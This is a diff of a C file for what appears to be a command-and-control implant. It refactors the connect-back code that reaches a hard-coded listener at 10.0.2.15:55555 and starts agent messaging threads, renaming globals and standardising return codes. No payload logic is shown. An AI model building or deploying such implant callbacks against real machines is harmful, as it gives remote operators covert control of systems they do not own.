@@ -2,13 +2,13 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include <errno.h>
 #include <pthread.h>
 
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
+#include "utility.h"
 #include "implant.h"
 #include "queue.h"
 #include "agent_comms.h"
@@ -16,11 +16,11 @@
 
 // Globals
 // Receive Queue
-Queue* receive_queue;
-pthread_mutex_t receive_queue_lock;
+Queue* agent_receive_queue;
+pthread_mutex_t agent_receive_queue_lock;
 // Send Queue
-Queue* send_queue;
-pthread_mutex_t send_queue_lock;
+Queue* agent_send_queue;
+pthread_mutex_t agent_send_queue_lock;
 
 int connect_to_listener(char* ip_addr, int port){
 
@@ -33,7 +33,7 @@ int connect_to_listener(char* ip_addr, int port){
 
     if (ip_addr == NULL || !port){
         printf("Bad IP or port\n");
-        return -1;
+        return RET_ERROR;
     }
 
     addr.sin_family = AF_INET;
@@ -41,18 +41,17 @@ int connect_to_listener(char* ip_addr, int port){
 
     if (inet_pton(AF_INET, ip_addr, &addr.sin_addr) <= 0){
         printf("inet_pton failed\n");
-        return -1;
+        return RET_ERROR;
     }
 
     if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
         printf("socket failed\n");
-        return -1;
+        return RET_ERROR;
     }
 
     if ((status = connect(sockfd, (struct sockaddr*)&addr, sizeof(addr))) < 0){
         printf("connect failed\n");
-        // printf("%s\n", strerror(errno));
-        return -1;
+        return RET_ERROR;
     }
     
     // Start agent receive thread
@@ -67,20 +66,24 @@ int connect_to_listener(char* ip_addr, int port){
     pthread_join(agent_message_handler_tid, NULL);
 
     close(sockfd);
-    return 0;
+    return RET_OK;;
 }
 
+#ifndef UNIT_TESTING
 int main(int argc, char** argv){
     char* ip_addr = "10.0.2.15";
     int port = 55555;
     
     // Create receive queue
-    receive_queue = createQueue(QUEUE_SIZE);
-    pthread_mutex_init(&receive_queue_lock, NULL);
+    agent_receive_queue = createQueue(QUEUE_SIZE);
+    pthread_mutex_init(&agent_receive_queue_lock, NULL);
     // Create send queue
-    send_queue = createQueue(QUEUE_SIZE);
-    pthread_mutex_init(&send_queue_lock, NULL);
+    agent_send_queue = createQueue(QUEUE_SIZE);
+    pthread_mutex_init(&agent_send_queue_lock, NULL);
     
     connect_to_listener(ip_addr, port);
-    return 0;
+    return RET_OK;;
 }
+#endif /* UNIT_TESTING */
+
+
